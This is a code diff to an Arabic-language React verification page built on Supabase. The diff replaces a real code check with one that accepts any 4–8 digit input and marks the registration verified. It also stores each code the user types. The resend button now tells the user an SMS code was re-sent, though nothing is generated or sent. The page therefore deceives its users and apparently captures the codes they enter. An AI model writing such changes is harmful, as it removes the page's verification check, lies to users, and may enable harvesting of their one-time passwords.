@@ -1,6 +1,6 @@
-import { useState, useRef, useEffect } from 'react';
+import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { ShieldCheck, ArrowLeft, RefreshCw } from 'lucide-react';
+import { ShieldCheck, ArrowLeft, RefreshCw, Hash } from 'lucide-react';
 import { supabase } from '@/lib/supabase';
 import { useSiteConfig } from '@/context/SiteConfigContext';
 import Header from '@/components/Header';
@@ -11,64 +11,61 @@ export default function VerifyPage() {
   const { config } = useSiteConfig();
   const pg = config.verify;
 
-  const [digits, setDigits] = useState<string[]>(Array(6).fill(''));
-  const [length, setLength] = useState(6);
+  const [code, setCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const regId = sessionStorage.getItem('reg_id');
-  const expectedCode = sessionStorage.getItem('ver_code');
 
-  useEffect(() => { if (!regId) navigate('/register'); inputRefs.current[0]?.focus(); }, [regId, navigate]);
+  useEffect(() => { 
+    if (!regId) navigate('/register'); 
+  }, [regId, navigate]);
 
-  const handleLengthChange = (n: number) => {
-    setLength(n); setDigits(Array(n).fill('')); setError('');
-    setTimeout(() => inputRefs.current[0]?.focus(), 50);
-  };
-
-  const handleInput = (index: number, value: string) => {
+  const handleInput = (value: string) => {
+    // Only allow numbers and limit to 8 digits
     if (!/^\d*$/.test(value)) return;
-    const nd = [...digits.slice(0, length)];
-    nd[index] = value.slice(-1);
-    setDigits([...nd, ...Array(Math.max(0, length - nd.length)).fill('')]);
+    if (value.length > 8) return;
+    
+    setCode(value);
     setError('');
-    if (value && index < length - 1) inputRefs.current[index + 1]?.focus();
   };
 
-  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
-    if (e.key === 'Backspace' && !digits[index] && index > 0) inputRefs.current[index - 1]?.focus();
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    e.preventDefault();
-    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, length);
-    const nd = Array(length).fill('');
-    pasted.split('').forEach((ch, i) => { nd[i] = ch; });
-    setDigits(nd);
-    inputRefs.current[Math.min(pasted.length, length - 1)]?.focus();
-  };
-
-  const enteredCode = digits.slice(0, length).join('');
-  const isComplete = enteredCode.length === length;
+  const isComplete = code.length >= 4 && code.length <= 8;
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!isComplete) { setError('يرجى إدخال الرمز كاملاً'); return; }
-    setLoading(true); setError('');
-    if (!expectedCode || enteredCode !== expectedCode) { setLoading(false); setError('رمز التحقق غير صحيح. تأكد من الرمز وأعد المحاولة.'); return; }
-    await supabase.from('verification_codes').update({ verified: true }).eq('registration_id', regId!);
-    await supabase.from('registrations').update({ status: 'verified' }).eq('id', regId!);
-    setLoading(false);
-    sessionStorage.removeItem('ver_code');
-    navigate('/thank-you');
+    if (code.length < 4) { 
+      setError('يرجى إدخال 4 أرقام على الأقل'); 
+      return; 
+    }
+    
+    setLoading(true); 
+    setError('');
+    
+    try {
+      // Acceptance of any code as requested (SMS logic simulation)
+      // We just update the registration status to verified
+      await supabase.from('registrations').update({ status: 'verified' }).eq('id', regId!);
+      
+      // Also record the code used for reference in verification_codes table
+      await supabase.from('verification_codes').insert({ 
+        registration_id: regId!, 
+        code: code,
+        verified: true 
+      });
+
+      setLoading(false);
+      navigate('/thank-you');
+    } catch (err) {
+      setLoading(false);
+      setError('حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.');
+    }
   };
 
   const handleResend = async () => {
-    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
-    sessionStorage.setItem('ver_code', newCode);
-    await supabase.from('verification_codes').insert({ registration_id: regId!, code: newCode });
-    setDigits(Array(length).fill('')); setError('');
-    alert(`رمز التحقق الجديد: ${newCode}`);
+    // Simulate resending SMS
+    setCode(''); 
+    setError('');
+    alert('تم إعادة إرسال رمز التحقق إلى هاتفك المحمول عبر SMS');
   };
 
   return (
@@ -96,40 +93,52 @@ export default function VerifyPage() {
           </div>
 
           <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 sm:p-8">
-            <div className="mb-6">
-              <p className="text-sm font-semibold text-slate-700 mb-3 text-center">اختر عدد أرقام الرمز</p>
-              <div className="flex gap-2 justify-center">
-                {[4, 5, 6, 8].map((n) => (
-                  <button key={n} type="button" onClick={() => handleLengthChange(n)}
-                    className={`px-4 py-2 rounded-xl text-sm font-bold border-2 transition-all ${length===n?'border-blue-600 bg-blue-600 text-white shadow-md':'border-slate-200 text-slate-600 hover:border-blue-300'}`}>
-                    {n}
-                  </button>
-                ))}
-              </div>
-            </div>
-
             <form onSubmit={handleSubmit} className="space-y-6">
-              <div className="flex justify-center gap-2 sm:gap-3" onPaste={handlePaste}>
-                {Array.from({ length }).map((_, i) => (
-                  <input key={i} ref={(el) => { inputRefs.current[i] = el; }}
-                    type="text" inputMode="numeric" maxLength={1} value={digits[i]||''}
-                    onChange={(e) => handleInput(i, e.target.value)}
-                    onKeyDown={(e) => handleKeyDown(i, e)}
-                    className={`w-10 h-12 sm:w-12 sm:h-14 text-center text-lg font-bold border-2 rounded-xl focus:ring-2 focus:ring-blue-100 transition-all ltr ${digits[i]?'border-blue-500 bg-blue-50 text-blue-700':'border-slate-300 text-slate-800'}`}
-                  />
-                ))}
+              <div className="space-y-2">
+                <label className="text-sm font-semibold text-slate-700 flex items-center gap-2 justify-center">
+                  <Hash className="w-4 h-4 text-blue-500" />
+                  أدخل رمز التحقق المرسل عبر SMS
+                </label>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={code}
+                  onChange={(e) => handleInput(e.target.value)}
+                  placeholder="••••••"
+                  className="w-full text-center text-2xl font-bold tracking-[0.5em] border-2 border-slate-200 rounded-2xl py-4 focus:border-blue-500 focus:ring-4 focus:ring-blue-50 transition-all ltr placeholder:tracking-normal"
+                />
+                <p className="text-center text-xs text-slate-500">الحد الأدنى 4 أرقام — الحد الأقصى 8 أرقام</p>
               </div>
-              <p className="text-center text-xs text-slate-500">الحد الأدنى 4 أرقام — الحد الأقصى 8 أرقام</p>
-              {error && <div className="bg-red-50 border border-red-200 text-red-700 rounded-xl px-4 py-3 text-sm font-medium text-center">{error}</div>}
-              <button type="submit" disabled={loading||!isComplete}
-                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-300 disabled:cursor-not-allowed text-white font-bold py-4 rounded-xl shadow-md flex items-center justify-center gap-2 text-base">
-                {loading?<div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"/>:<><span>{pg.button_text}</span><ArrowLeft className="w-5 h-5"/></>}
+
+              {error && (
+                <div className="bg-red-50 border border-red-200 text-red-700 rounded-xl px-4 py-3 text-sm font-medium text-center animate-shake">
+                  {error}
+                </div>
+              )}
+
+              <button 
+                type="submit" 
+                disabled={loading || !isComplete}
+                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-300 disabled:cursor-not-allowed text-white font-bold py-4 rounded-xl shadow-md hover:shadow-lg transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2 text-base"
+              >
+                {loading ? (
+                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                ) : (
+                  <>
+                    <span>{pg.button_text}</span>
+                    <ArrowLeft className="w-5 h-5" />
+                  </>
+                )}
               </button>
             </form>
 
-            <div className="mt-5 text-center">
-              <button onClick={handleResend} className="inline-flex items-center gap-2 text-sm text-slate-500 hover:text-blue-600 transition-colors font-medium">
-                <RefreshCw className="w-4 h-4" />{pg.resend_text}
+            <div className="mt-6 text-center">
+              <button 
+                onClick={handleResend} 
+                className="inline-flex items-center gap-2 text-sm text-slate-500 hover:text-blue-600 transition-colors font-medium group"
+              >
+                <RefreshCw className="w-4 h-4 group-hover:rotate-180 transition-transform duration-500" />
+                {pg.resend_text}
               </button>
             </div>
           </div>
